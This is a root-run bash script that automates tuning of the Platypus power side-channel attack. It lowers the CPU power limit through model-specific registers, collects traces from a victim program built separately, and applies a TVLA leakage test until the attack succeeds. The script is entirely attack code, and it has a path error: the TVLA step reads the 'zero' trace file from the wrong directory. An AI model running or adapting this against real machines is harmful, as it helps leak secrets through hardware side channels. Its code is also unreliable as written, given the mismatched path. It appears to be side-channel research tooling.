#!/bin/bash

# Platypus Attack Power Tuning Script
# This script finds the optimal power limit for the Platypus attack by
# gradually reducing the power limit until TVLA leakage is detected

set -e  # Exit immediately if a command exits with a non-zero status

# Initial power limit settings
INITIAL_POWER=1300
MIN_POWER=100
POWER_STEP=100
CURRENT_POWER=$INITIAL_POWER

# Default settings for other parameters
ENABLE1=1
ENABLE2=1
CLAMP1=0
CLAMP2=0
TIME_WINDOW1=15  # 0xF
TIME_WINDOW2=15  # 0xF

# Output file for results
RESULTS_FILE="platypus_results.log"
echo "Power Limit, TVLA Result" > $RESULTS_FILE

# Check if user is root
if [ "$EUID" -ne 0 ]; then
    echo "This script must be run as root to access MSRs."
    echo "Please run with: sudo $0"
    exit 1
fi

# Check if MSR module is loaded
if ! lsmod | grep -q "^msr "; then
    echo "Loading MSR module..."
    modprobe msr
    if [ $? -ne 0 ]; then
        echo "Failed to load MSR module. Are you running a supported kernel?"
        exit 1
    fi
fi

# Compile the controller
echo "Compiling controller..."
make controller
if [ ! -f "./controller" ]; then
    echo "Failed to compile controller. Check for compilation errors."
    exit 1
fi

# Compile the main program
echo "Compiling main program..."
make main
if [ ! -f "./main" ]; then
    echo "Failed to compile main program. Check for compilation errors."
    exit 1
fi

echo "===== Platypus Attack Power Limit Tuner ====="
echo "Starting with power limit: $CURRENT_POWER"
echo "Will decrease by $POWER_STEP until leakage is detected or minimum $MIN_POWER is reached"

# Function to run the test with current power settings
function run_test() {
    local power=$1
    
    echo "Testing with power limit: $power"
    
    # Set the power limit using the controller
    echo "Setting power limit..."
    ./controller $power $power $ENABLE1 $ENABLE2 $CLAMP1 $CLAMP2 $TIME_WINDOW1 $TIME_WINDOW2
    if [ $? -ne 0 ]; then
        echo "Failed to set power limit. Skipping this test."
        return 2
    fi
    
    # # Clear previous test results if they exist
    # rm -f zero.csv full.csv
    
    # Run the tests
    echo "Running test with factor=0..."
    sudo taskset -c 1 ./main 0 2> data/zero_"$power".csv
    
    echo "Running test with factor=255..."
    sudo taskset -c 1 ./main 255 2> data/full_"$power".csv
    
    # Run TVLA analysis
    echo "Running TVLA analysis..."
    TVLA_RESULT=$(python3 test.py zero_"$power".csv data/full_"$power".csv "$power" | grep "TVLA Test Result:" | awk '{print $4}')
    
    echo "TVLA Result: $TVLA_RESULT"
    
    # Log result
    echo "$power, $TVLA_RESULT" >> $RESULTS_FILE
    
    # Return the TVLA result (1 = leakage detected, 0 = no leakage)
    return $TVLA_RESULT
}

# Main test loop
LEAK_DETECTED=0
SUCCESS_POWER=0

while [ $CURRENT_POWER -ge $MIN_POWER ] && [ $LEAK_DETECTED -eq 0 ]; do
    echo "============================================"
    echo "Testing power limit: $CURRENT_POWER"
    
    run_test $CURRENT_POWER
    TEST_RESULT=$?
    
    if [ $TEST_RESULT -eq 1 ]; then
        LEAK_DETECTED=1
        SUCCESS_POWER=$CURRENT_POWER
        echo "SUCCESS: Leakage detected at power limit $CURRENT_POWER!"
    elif [ $TEST_RESULT -eq 0 ]; then
        echo "No leakage detected at power limit $CURRENT_POWER. Decreasing power limit..."
        CURRENT_POWER=$((CURRENT_POWER - POWER_STEP))
    else
        echo "Test failed. Decreasing power limit and trying again..."
        CURRENT_POWER=$((CURRENT_POWER - POWER_STEP))
    fi
done

# Summarize results
echo "============================================"
if [ $LEAK_DETECTED -eq 1 ]; then
    echo "Platypus attack successful!"
    echo "The optimal power limit for running the Platypus attack is: $SUCCESS_POWER"
else
    echo "No leakage detected at any tested power limit (down to $MIN_POWER)."
    echo "Try adjusting other parameters or checking hardware compatibility."
fi

echo "Results have been saved to $RESULTS_FILE"
echo "============================================"

# Clean up (optional, commented out by default)
# make clean